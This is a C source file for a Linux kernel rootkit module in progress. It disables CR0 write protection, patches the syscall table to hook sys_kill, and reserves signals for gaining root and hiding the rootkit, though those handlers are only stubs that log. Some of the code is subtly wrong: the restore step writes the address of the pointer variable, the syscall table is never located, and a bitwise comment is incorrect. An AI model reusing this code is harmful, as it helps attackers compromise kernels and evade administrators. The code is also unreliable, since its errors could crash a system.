/*
library for the hooking via the syscall table
*/
#include <linux/kernel.h> //contains types, macros, functions for the kernel   e.g. KERN_INFO
#include <linux/unistd.h> //contains syscall names to numbers
#include <linux/version.h> //contains versions  e.g. LINUX_VERSION_CODE KERNEL_VERSION
#include <asm/paravirt.h> //contains functions for read_cr0()
#include <linux/kprobes.h> //kprobes- used in workaround for kallsyms_lookup_name not exported


//syscalls in new kernel use pt_regs struct for information, so is generic fnction type for syscalls
typedef asmlinkage long (*ptregs_t)(const struct pt_regs *regs);

//core hooking functions
static int store(void); //stores all of the origional syscalls in functions
static void setup_hooks(void); //overwites syscall table with hooked functions
static void cleanup(void); //overwrites syscall table with origional functions
static void write_cr0_forced(unsigned long val); //overwrites the cr0
static void set_memory_protection(bool val); //turns on memory protection

//function for the sys_kill hook
ptregs_t orig_kill=(ptregs_t) 0; //origional kill
static asmlinkage long hooked_kill(const struct pt_regs *regs); //hooked KILL_SIGNALS
enum KILL_SIGNALS{ //signals ued in communication by sys_kill
  SIGROOT = 64, //make process root
  SIGINVIS = 63, //hide/ unhide rootkit
};

static asmlinkage long hooked_kill(const struct pt_regs *regs){
  int sig = regs->si; //gets signal from pt_regs structure
  if (sig == SIGROOT){ //if signal = signal for making process root
    printk(KERN_INFO "recieved signal root\n");
    return 0;
  }
  if (sig == SIGINVIS){ //if signal = signal for making rootkit invisible
    printk(KERN_INFO "recieved signal invisible\n");
    return 0;
  }
  return orig_kill(regs); //kills process and returns result
}


//stores the adress of the origional functions
static int store(void){
  orig_kill = (ptregs_t) __sys_call_table[__NR_kill];
  printk(KERN_INFO "sys_call kill stored");
  return 0;
}


static void write_cr0_forced(unsigned long val){
  unsigned long __force_order;
  //nasm code to rewrite cr0
  asm volatile(
    "mov %0, %%cr0"
    : "+r"(val), "+m"(__force_order));
    //to prevent reads from being recorded with
    //respect to writes, use dummy memory operand
    //"+m"(__force_order)
}

//edits write protection
static void set_memory_protection(bool val){
  if (val){ //turn memory protection on
    //bitwise OR copies bit to result if it is in either operands
    write_cr0_forced(read_cr0() | (0x10000));
    printk(KERN_INFO "memory protection reastablished\n");
  }
  else{
    //bitwise AND copies bitsto result if it is in both operands
    //unary reverse (~) reverses bits so 0x10000 becomes 0x01111
    write_cr0_forced(read_cr0() & (~ 0x10000));
    printk(KERN_INFO "memory protection removed\n");
  }
}




//hooks syscall
static void setup_hooks(void){
  store(); //stores the origional functions
  set_memory_protection(false); //disables memory protection in cr0
  printk("set sys_kill to %p", hooked_kill);
  __sys_call_table[__NR_kill] = (long unsigned int) &hooked_kill; //rewrites the adress of sys_kill to point to hooked_kill
  set_memory_protection(true); //enables memory protection in cr0
}

//sets the sys_call_table back to normal
static void cleanup(void){
  set_memory_protection(false); //disables memory protection in cr0
  printk("set sys_kill to %p", orig_kill);
  __sys_call_table[__NR_kill] = (long unsigned int) &orig_kill;
  set_memory_protection(true); //enables memory protection in cr0
}
